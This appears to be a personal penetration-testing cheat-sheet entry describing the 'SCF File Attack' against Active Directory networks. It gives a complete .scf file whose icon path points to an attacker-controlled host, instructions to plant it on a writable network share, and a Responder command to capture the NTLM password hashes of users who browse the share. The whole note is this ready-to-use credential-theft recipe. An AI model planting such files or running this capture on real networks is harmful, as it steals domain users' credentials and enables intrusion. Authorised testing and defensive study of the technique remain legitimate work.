---
tags: [AD, Tricks]
title: Tricks/SCF File Attack
created: '2020-01-04T22:02:28.491Z'
modified: '2020-01-04T22:18:56.114Z'
---

# Tricks/SCF File Attack
> If a file share doesn’t contain any data that could be used to connect to other systems but it is configured with write permissions for unauthenticated users then it is possible to obtain passwords hashes of domain users.

1. Plant the code below inside of a text file, planted into a network share.
```
[Shell]
Command=2
IconFile=\\<lhost>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
2. Save the file as `@<filename>.scf`
3. Start Responder to capture the hashes of the users that will browse the share
```
responder -wrf --lm -v -I <interface>
```
4. Wait to capture the hash (~5min)
